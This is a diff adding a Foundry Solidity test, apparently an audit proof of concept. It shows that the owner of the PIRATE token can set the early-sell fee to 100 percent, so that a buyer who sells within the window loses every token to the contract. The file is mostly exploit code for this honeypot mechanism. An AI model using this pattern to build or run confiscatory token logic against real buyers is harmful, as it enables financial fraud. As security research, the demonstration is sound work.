@@ -1,0 +1,98 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.9;
+
+import "forge-std/Test.sol";
+
+interface IPIRATE {
+    function owner() external view returns (address);
+    function uniswapV2Router() external view returns (address);
+    function uniswapV2Pair() external view returns (address);
+    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee, uint256 _earlySellLiquidityFee, uint256 _earlySellMarketingFee, uint256 _earlySellDevFee) external;
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function enableEarlySellTax() external view returns (bool);
+    function totalSupply() external view returns (uint256);
+}
+
+interface IUniswapV2Router02 {
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256[] memory amounts);
+    function WETH() external pure returns (address);
+}
+
+contract ExploitTest is Test {
+    address constant PIRATE = 0xDF7C19f2a7E107aE6578293Bebbe3681cdfd0F42;
+    IPIRATE pirate = IPIRATE(PIRATE);
+
+    function testEarlySellTax100Percent() public {
+        // ---- 1. Retrieve owner and confirm early sell tax is enabled ----
+        address owner = pirate.owner();
+        vm.label(owner, "Owner");
+        assertTrue(pirate.enableEarlySellTax(), "Early sell tax should be enabled");
+
+        // ---- 2. Owner sets early sell fees to 100% (100 out of 100) ----
+        vm.startPrank(owner);
+        // Regular sell fees (not used) – keep 0 to satisfy <=15 requirement
+        pirate.updateSellFees(0, 0, 0, 0, 100, 0);
+        vm.stopPrank();
+
+        // ---- 3. Prepare user and buy tokens through the swap ----
+        address user = address(0x1234);
+        vm.label(user, "User");
+        deal(user, 10 ether); // give BNB to user
+
+        address routerAddr = pirate.uniswapV2Router();
+        IUniswapV2Router02 router = IUniswapV2Router02(routerAddr);
+        address WETH = router.WETH();
+        address pair = pirate.uniswapV2Pair();
+
+        // Record contract and pair balances before buy
+        uint256 contractBefore = pirate.balanceOf(PIRATE);
+        uint256 pairBefore = pirate.balanceOf(pair);
+
+        vm.startPrank(user);
+        address[] memory pathBuy = new address[](2);
+        pathBuy[0] = WETH;
+        pathBuy[1] = PIRATE;
+
+        uint256 buyValue = 1 ether;
+        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyValue}(
+            1,   // minOut (accept any amount)
+            pathBuy,
+            user,
+            block.timestamp
+        );
+
+        uint256 userBalance = pirate.balanceOf(user);
+        console.log("User PIRATE after buy:", userBalance);
+        require(userBalance > 0, "User must receive tokens after buy");
+
+        // ---- 4. Warp time to stay within the 24‑hour early sell window ----
+        vm.warp(block.timestamp + 1 hours);
+
+        // ---- 5. User sells directly to the pair (simulates a sell) ----
+        uint256 sellAmount = userBalance;
+        bool success = pirate.transfer(pair, sellAmount);
+        require(success, "Transfer (sell) must succeed");
+
+        // ---- 6. Assertions – user lost all tokens, contract obtained all ----
+        uint256 userAfter = pirate.balanceOf(user);
+        uint256 contractAfter = pirate.balanceOf(PIRATE);
+        uint256 pairAfter = pirate.balanceOf(pair);
+
+        assertEq(userAfter, 0, "User should have zero tokens after sell");
+        // Contract should have received the entire sell amount (100% fee)
+        assertGe(contractAfter - contractBefore, sellAmount, "Contract must gain at least the full sell amount as fees");
+        // Pair balance should be unchanged (0 tokens transferred to pair)
+        assertEq(pairAfter, pairBefore, "Pair balance must not increase (no tokens transferred)");
+
+        vm.stopPrank();
+    }
+}
+```
